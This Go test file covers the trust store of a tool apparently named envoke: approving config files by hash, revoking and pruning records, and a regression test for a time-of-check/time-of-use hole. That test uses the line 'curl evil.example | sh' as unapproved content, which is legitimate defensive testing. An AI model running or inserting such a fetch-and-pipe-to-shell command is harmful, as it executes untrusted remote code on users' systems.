package trust

import (
	"os"
	"path/filepath"
	"testing"
)

// isolateEnv points the home directory at a fresh temp dir so the store
// lands under it rather than the developer's real ~/.local/share.
//
// Both HOME and USERPROFILE are set: os.UserHomeDir, which storeDir falls
// back to, reads USERPROFILE on Windows and HOME everywhere else. Setting
// only HOME would silently let these tests write into a real home
// directory on Windows.
func isolateEnv(t *testing.T) (home string) {
	t.Helper()
	home = t.TempDir()
	t.Setenv("HOME", home)
	t.Setenv("USERPROFILE", home)
	t.Setenv("XDG_DATA_HOME", "")
	return home
}

func writeConfig(t *testing.T, path, content string) {
	t.Helper()
	if err := os.WriteFile(path, []byte(content), 0o644); err != nil {
		t.Fatalf("WriteFile: %v", err)
	}
}

// allowFile and isTrustedFile read path and delegate to the real API,
// which takes the content bytes rather than a path on purpose (see
// IsTrusted's doc comment): the caller is the only place that can guarantee
// the bytes it validates are the bytes it acts on. These helpers keep the
// store-semantics tests below readable without reintroducing that read
// inside the package under test.
func allowFile(t *testing.T, path string) error {
	t.Helper()
	content, err := os.ReadFile(path)
	if err != nil {
		return err
	}
	return Allow(path, content)
}

func isTrustedFile(t *testing.T, path string) (bool, error) {
	t.Helper()
	content, err := os.ReadFile(path)
	if err != nil {
		return false, err
	}
	return IsTrusted(path, content)
}

func TestIsTrusted_NeverAllowedIsFalse(t *testing.T) {
	home := isolateEnv(t)
	path := filepath.Join(home, "envokerc")
	writeConfig(t, path, "enter /a\n    echo hi\n")

	trusted, err := isTrustedFile(t, path)
	if err != nil {
		t.Fatalf("IsTrusted: %v", err)
	}
	if trusted {
		t.Errorf("expected untrusted config to report false")
	}
}

func TestIsTrusted_NoRecordIsFalseNotError(t *testing.T) {
	home := isolateEnv(t)
	path := filepath.Join(home, "does-not-exist")

	trusted, err := IsTrusted(path, []byte("enter /a\n    echo hi\n"))
	if err != nil {
		t.Fatalf("IsTrusted: %v", err)
	}
	if trusted {
		t.Errorf("expected a path with no trust record to report false")
	}
}

// TestIsTrusted_JudgesGivenContentNotFileOnDisk is the regression test for a
// TOCTOU hole: IsTrusted used to re-read the config file itself, so the
// bytes it hashed were not necessarily the bytes the caller had already
// parsed and was about to execute. A config could therefore be executed in
// one version while being validated against another -- swap the file back
// to its approved content between the two reads and anything ran.
//
// Judging exactly the bytes it is handed is what makes that impossible to
// express: here the file on disk is the approved content, yet asking about
// different bytes still reports untrusted.
func TestIsTrusted_JudgesGivenContentNotFileOnDisk(t *testing.T) {
	home := isolateEnv(t)
	path := filepath.Join(home, "envokerc")
	const approved = "enter /a\n    echo hi\n"
	writeConfig(t, path, approved)
	if err := allowFile(t, path); err != nil {
		t.Fatalf("Allow: %v", err)
	}

	trusted, err := IsTrusted(path, []byte("enter /a\n    curl evil.example | sh\n"))
	if err != nil {
		t.Fatalf("IsTrusted: %v", err)
	}
	if trusted {
		t.Errorf("content that was never approved must report untrusted, even when the file on disk is the approved one")
	}

	// Sanity check the other direction: the approved bytes still pass.
	trusted, err = IsTrusted(path, []byte(approved))
	if err != nil {
		t.Fatalf("IsTrusted: %v", err)
	}
	if !trusted {
		t.Errorf("expected the approved content to report trusted")
	}
}

func TestAllow_ThenIsTrusted(t *testing.T) {
	home := isolateEnv(t)
	path := filepath.Join(home, "envokerc")
	writeConfig(t, path, "enter /a\n    echo hi\n")

	if err := allowFile(t, path); err != nil {
		t.Fatalf("Allow: %v", err)
	}

	trusted, err := isTrustedFile(t, path)
	if err != nil {
		t.Fatalf("IsTrusted: %v", err)
	}
	if !trusted {
		t.Errorf("expected config to be trusted after Allow")
	}
}

func TestIsTrusted_EditAfterAllowRevokesTrust(t *testing.T) {
	home := isolateEnv(t)
	path := filepath.Join(home, "envokerc")
	writeConfig(t, path, "enter /a\n    echo hi\n")

	if err := allowFile(t, path); err != nil {
		t.Fatalf("Allow: %v", err)
	}

	// Even a whitespace-only edit must revoke trust.
	writeConfig(t, path, "enter /a\n    echo hi\n\n")

	trusted, err := isTrustedFile(t, path)
	if err != nil {
		t.Fatalf("IsTrusted: %v", err)
	}
	if trusted {
		t.Errorf("expected edited config to be untrusted")
	}
}

func TestAllow_ReapprovingAfterEditRestoresTrust(t *testing.T) {
	home := isolateEnv(t)
	path := filepath.Join(home, "envokerc")
	writeConfig(t, path, "enter /a\n    echo hi\n")
	if err := allowFile(t, path); err != nil {
		t.Fatalf("Allow: %v", err)
	}

	writeConfig(t, path, "enter /a\n    echo bye\n")
	if err := allowFile(t, path); err != nil {
		t.Fatalf("Allow (re-approve): %v", err)
	}

	trusted, err := isTrustedFile(t, path)
	if err != nil {
		t.Fatalf("IsTrusted: %v", err)
	}
	if !trusted {
		t.Errorf("expected re-approved config to be trusted")
	}
}

func TestTrust_DistinctPathsDoNotCollide(t *testing.T) {
	home := isolateEnv(t)
	pathA := filepath.Join(home, "a", "envokerc")
	pathB := filepath.Join(home, "b", "envokerc")
	if err := os.MkdirAll(filepath.Join(home, "a"), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.MkdirAll(filepath.Join(home, "b"), 0o755); err != nil {
		t.Fatal(err)
	}
	writeConfig(t, pathA, "enter /a\n    echo a\n")
	writeConfig(t, pathB, "enter /b\n    echo b\n")

	if err := allowFile(t, pathA); err != nil {
		t.Fatalf("Allow(a): %v", err)
	}

	trustedA, err := isTrustedFile(t, pathA)
	if err != nil {
		t.Fatalf("IsTrusted(a): %v", err)
	}
	trustedB, err := isTrustedFile(t, pathB)
	if err != nil {
		t.Fatalf("IsTrusted(b): %v", err)
	}
	if !trustedA {
		t.Errorf("expected pathA to be trusted")
	}
	if trustedB {
		t.Errorf("expected pathB to remain untrusted (must not share a's record)")
	}
}

func TestAllow_UsesXDGDataHomeWhenSet(t *testing.T) {
	home := isolateEnv(t)
	xdg := t.TempDir()
	t.Setenv("XDG_DATA_HOME", xdg)

	path := filepath.Join(home, "envokerc")
	writeConfig(t, path, "enter /a\n    echo hi\n")
	if err := allowFile(t, path); err != nil {
		t.Fatalf("Allow: %v", err)
	}

	entries, err := os.ReadDir(filepath.Join(xdg, "envoke", "allow"))
	if err != nil {
		t.Fatalf("expected trust record under XDG_DATA_HOME, ReadDir: %v", err)
	}
	if len(entries) != 3 {
		t.Errorf("expected exactly 3 entries (hash record + .content + .path), got %d", len(entries))
	}
}

func TestAllow_PreviousContentRoundTrips(t *testing.T) {
	home := isolateEnv(t)
	path := filepath.Join(home, "envokerc")
	const cfg = "enter /a\n    echo hi\n"
	writeConfig(t, path, cfg)

	if err := allowFile(t, path); err != nil {
		t.Fatalf("Allow: %v", err)
	}

	content, ok, err := PreviousContent(path)
	if err != nil {
		t.Fatalf("PreviousContent: %v", err)
	}
	if !ok {
		t.Fatalf("expected ok=true after Allow")
	}
	if content != cfg {
		t.Errorf("PreviousContent = %q, want %q", content, cfg)
	}
}

func TestPreviousContent_NeverAllowedIsNotOkNotError(t *testing.T) {
	home := isolateEnv(t)
	path := filepath.Join(home, "envokerc")
	writeConfig(t, path, "enter /a\n    echo hi\n")

	content, ok, err := PreviousContent(path)
	if err != nil {
		t.Fatalf("PreviousContent: %v", err)
	}
	if ok {
		t.Errorf("expected ok=false for a config that was never allowed")
	}
	if content != "" {
		t.Errorf("expected empty content, got %q", content)
	}
}

func TestAllow_ReapprovingSupersedesPreviousContent(t *testing.T) {
	home := isolateEnv(t)
	path := filepath.Join(home, "envokerc")
	writeConfig(t, path, "enter /a\n    echo hi\n")
	if err := allowFile(t, path); err != nil {
		t.Fatalf("Allow: %v", err)
	}

	const updated = "enter /a\n    echo bye\n"
	writeConfig(t, path, updated)
	if err := allowFile(t, path); err != nil {
		t.Fatalf("Allow (re-approve): %v", err)
	}

	content, ok, err := PreviousContent(path)
	if err != nil {
		t.Fatalf("PreviousContent: %v", err)
	}
	if !ok {
		t.Fatalf("expected ok=true after re-approval")
	}
	if content != updated {
		t.Errorf("PreviousContent = %q, want %q (the re-approved content)", content, updated)
	}

	trusted, err := isTrustedFile(t, path)
	if err != nil {
		t.Fatalf("IsTrusted: %v", err)
	}
	if !trusted {
		t.Errorf("expected re-approved config to be trusted")
	}
}

func TestList_EmptyStoreIsEmptyNotError(t *testing.T) {
	isolateEnv(t)
	records, err := List()
	if err != nil {
		t.Fatalf("List: %v", err)
	}
	if len(records) != 0 {
		t.Errorf("expected no records for an untouched store, got %d", len(records))
	}
}

func TestList_ReportsApprovedPathsSorted(t *testing.T) {
	home := isolateEnv(t)
	pathB := filepath.Join(home, "b-envokerc")
	pathA := filepath.Join(home, "a-envokerc")
	writeConfig(t, pathB, "enter /b\n    echo b\n")
	writeConfig(t, pathA, "enter /a\n    echo a\n")
	for _, p := range []string{pathB, pathA} {
		if err := allowFile(t, p); err != nil {
			t.Fatalf("Allow(%s): %v", p, err)
		}
	}

	records, err := List()
	if err != nil {
		t.Fatalf("List: %v", err)
	}
	if len(records) != 2 {
		t.Fatalf("expected 2 records, got %d", len(records))
	}
	if records[0].ConfigPath != pathA || records[1].ConfigPath != pathB {
		t.Errorf("records = %q, %q; want them sorted by path", records[0].ConfigPath, records[1].ConfigPath)
	}
	if records[0].Hash == "" {
		t.Errorf("expected the record to carry the approved hash")
	}
}

// A record written before the store recorded config paths still has to
// list, since the alternative is silently hiding a config that really is
// trusted.
func TestList_PreUpgradeRecordHasNoPathButStillLists(t *testing.T) {
	home := isolateEnv(t)
	path := filepath.Join(home, "envokerc")
	writeConfig(t, path, "enter /a\n    echo hi\n")
	writeLegacyRecord(t, path, "enter /a\n    echo hi\n")

	records, err := List()
	if err != nil {
		t.Fatalf("List: %v", err)
	}
	if len(records) != 1 {
		t.Fatalf("expected 1 record, got %d", len(records))
	}
	if records[0].ConfigPath != "" {
		t.Errorf("ConfigPath = %q, want empty for a record with no .path sibling", records[0].ConfigPath)
	}
	if records[0].StorePath == "" {
		t.Errorf("StorePath must be set so the record can be reported and removed by hand")
	}
}

func TestRevoke_RemovesTrustAndAllSiblings(t *testing.T) {
	home := isolateEnv(t)
	path := filepath.Join(home, "envokerc")
	writeConfig(t, path, "enter /a\n    echo hi\n")
	if err := allowFile(t, path); err != nil {
		t.Fatalf("Allow: %v", err)
	}

	found, err := Revoke(path)
	if err != nil {
		t.Fatalf("Revoke: %v", err)
	}
	if !found {
		t.Errorf("expected Revoke to report it found a record")
	}

	trusted, err := isTrustedFile(t, path)
	if err != nil {
		t.Fatalf("IsTrusted: %v", err)
	}
	if trusted {
		t.Errorf("config must be untrusted after Revoke")
	}
	// The content copy is a plaintext duplicate of a config that routinely
	// holds secrets; revoking has to take it with it, not just the hash.
	if _, ok, err := PreviousContent(path); err != nil || ok {
		t.Errorf("PreviousContent after Revoke = ok %v (err %v), want the copy gone", ok, err)
	}
	entries, err := os.ReadDir(filepath.Join(home, ".local", "share", "envoke", "allow"))
	if err != nil {
		t.Fatalf("ReadDir: %v", err)
	}
	if len(entries) != 0 {
		t.Errorf("expected the store to be empty after revoking its only record, got %d entries", len(entries))
	}
}

// Revoking something that was never trusted is the requested end state
// already holding, not a failure.
func TestRevoke_UntrustedConfigIsNotFoundNotError(t *testing.T) {
	home := isolateEnv(t)
	path := filepath.Join(home, "envokerc")
	writeConfig(t, path, "enter /a\n    echo hi\n")

	found, err := Revoke(path)
	if err != nil {
		t.Fatalf("Revoke: %v", err)
	}
	if found {
		t.Errorf("expected found=false for a config that was never trusted")
	}
}

func TestPrune_RemovesRecordsForDeletedConfigsOnly(t *testing.T) {
	home := isolateEnv(t)
	kept := filepath.Join(home, "kept")
	gone := filepath.Join(home, "gone")
	writeConfig(t, kept, "enter /a\n    echo a\n")
	writeConfig(t, gone, "enter /b\n    echo b\n")
	for _, p := range []string{kept, gone} {
		if err := allowFile(t, p); err != nil {
			t.Fatalf("Allow(%s): %v", p, err)
		}
	}
	if err := os.Remove(gone); err != nil {
		t.Fatalf("Remove: %v", err)
	}

	removed, skipped, err := Prune()
	if err != nil {
		t.Fatalf("Prune: %v", err)
	}
	if len(skipped) != 0 {
		t.Errorf("expected nothing skipped, got %d", len(skipped))
	}
	if len(removed) != 1 || removed[0].ConfigPath != gone {
		t.Fatalf("removed = %+v, want exactly the deleted config", removed)
	}

	trusted, err := isTrustedFile(t, kept)
	if err != nil {
		t.Fatalf("IsTrusted: %v", err)
	}
	if !trusted {
		t.Errorf("pruning must not touch a config that still exists")
	}
}

// A record with no recorded path can't be resolved to a file, so Prune has
// no way to tell "the config is gone" from "this predates path recording".
// Deleting a trust record on a guess is the wrong way to be wrong, so it
// reports instead.
func TestPrune_LeavesPreUpgradeRecordsAlone(t *testing.T) {
	home := isolateEnv(t)
	path := filepath.Join(home, "envokerc")
	writeConfig(t, path, "enter /a\n    echo hi\n")
	writeLegacyRecord(t, path, "enter /a\n    echo hi\n")
	if err := os.Remove(path); err != nil {
		t.Fatalf("Remove: %v", err)
	}

	removed, skipped, err := Prune()
	if err != nil {
		t.Fatalf("Prune: %v", err)
	}
	if len(removed) != 0 {
		t.Errorf("expected nothing removed, got %+v", removed)
	}
	if len(skipped) != 1 {
		t.Fatalf("expected the pre-upgrade record to be reported as skipped, got %d", len(skipped))
	}
}

// writeLegacyRecord fabricates a trust record in the shape an older envoke
// wrote: the hash file alone, with neither sibling.
func writeLegacyRecord(t *testing.T, configPath, content string) {
	t.Helper()
	recPath, err := recordPath(configPath)
	if err != nil {
		t.Fatalf("recordPath: %v", err)
	}
	if err := os.MkdirAll(filepath.Dir(recPath), 0o700); err != nil {
		t.Fatalf("MkdirAll: %v", err)
	}
	if err := os.WriteFile(recPath, []byte(hashContent([]byte(content))), 0o600); err != nil {
		t.Fatalf("WriteFile: %v", err)
	}
}

func TestIsTrusted_And_PreviousContent_HandlePreUpgradeHashOnlyRecord(t *testing.T) {
	home := isolateEnv(t)
	path := filepath.Join(home, "envokerc")
	const cfg = "enter /a\n    echo hi\n"
	writeConfig(t, path, cfg)

	// Simulate a trust record written by a pre-upgrade version of envoke:
	// only the hash file exists, no sibling .content file.
	recPath, err := recordPath(path)
	if err != nil {
		t.Fatalf("recordPath: %v", err)
	}
	if err := os.MkdirAll(filepath.Dir(recPath), 0o700); err != nil {
		t.Fatalf("MkdirAll: %v", err)
	}
	if err := os.WriteFile(recPath, []byte(hashContent([]byte(cfg))), 0o600); err != nil {
		t.Fatalf("WriteFile: %v", err)
	}

	trusted, err := isTrustedFile(t, path)
	if err != nil {
		t.Fatalf("IsTrusted: %v", err)
	}
	if !trusted {
		t.Errorf("expected hash-only pre-upgrade record to still report trusted")
	}

	content, ok, err := PreviousContent(path)
	if err != nil {
		t.Fatalf("PreviousContent: %v", err)
	}
	if ok {
		t.Errorf("expected ok=false for a pre-upgrade record with no content file")
	}
	if content != "" {
		t.Errorf("expected empty content, got %q", content)
	}
}
